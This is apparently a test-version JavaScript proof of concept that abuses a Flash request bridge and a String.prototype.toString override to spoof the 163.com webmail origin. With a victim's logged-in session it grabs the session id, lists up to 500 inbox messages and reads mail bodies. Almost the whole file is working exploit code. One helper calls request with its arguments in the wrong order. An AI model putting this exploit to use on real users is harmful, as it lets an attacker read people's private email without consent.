// test ver

check3rdCookie(function(enable) {
	if (!enable) {
		console.warn('3rd cookie disabled');
		return;
	}
	start();
});

function start() {
	if (getFlashVer() < 8) {
		console.warn('flash not support');
		return;
	}

	String.prototype.toString = function() {
		return 'mail.163.com';
	};

	var param = {
		callback: 'onCB',
		setLoaded: 'onOK'
	};

	var fla = createSwf('Main.swf', param);


	var URL_ENTRY = 'http://mail.163.com/entry/cgi/ntesdoor';

	var URL_LIST_MSG = 'http://mail.163.com/js6/s?sid=%1&func=mbox:listMessages';
	var XML_LIST_MSG = '<?xml version="1.0"?><object><int name="fid">1</int><string name="order">date</string><boolean name="desc">true</boolean><int name="limit">500</int><int name="start">0</int><boolean name="skipLockedFolders">false</boolean><string name="topFlag">top</string><boolean name="returnTag">true</boolean><boolean name="returnTotal">true</boolean></object>';

	var URL_READ_MAIL = 'http://mail.163.com/js6/s?func=mbox:getMessageData&sid=%1&mode=text&mid=%2';

	var URL_SWF = 'http://mail.163.com/js6/h/flashRequest.swf';
	var sid;

	window.__fla_ready = TRY(function() {
		fla.Install('mail.163');
	});


	var mapIdCb = {};

	window['onCB'] = TRY(function(id, handler, state, value) {
		if (handler == 'onreadystatechange' && state == 'complete') {
			var fn = mapIdCb[id];
			fn && fn(value);
		}
	});

	window['onOK'] = TRY(function() {
		step1();
	});

	function step1() {
		console.log('fetch sid');

		request('GET', URL_ENTRY, '', function(data) {

			var r = data.match(/sid\s*[=:]\s*['"]?(\w+)/);
			if (!r) {
				console.warn('sid not found');
				return;
			}

			sid = r[1];
			console.info('got sid:', sid);


			step2();
		});	
	}

	function step2() {
		var url = URL_LIST_MSG.replace('%1', sid);
		var arg = 'var=' + escape(XML_LIST_MSG);

		request('POST', url, arg, function(data) {
			// console.log(data);
			var parser = new DOMParser();
			var doc = parser.parseFromString(data, 'text/xml');
			console.log(doc);

			// log(data);
		});
	}


	function readMail(id, callback) {
		var url = URL_READ_MAIL.replace('%1', sid).replace('%2', id);
		request(url, 'GET', '', function(data) {
			console.log('mail:', data);
		});
	}

	function request(method, url, data, callback) {
		var id = fla.getFlashRequest();
		mapIdCb[id] = callback;

		fla.open(id, method, url);
		fla.send(id, data);
	}	
}

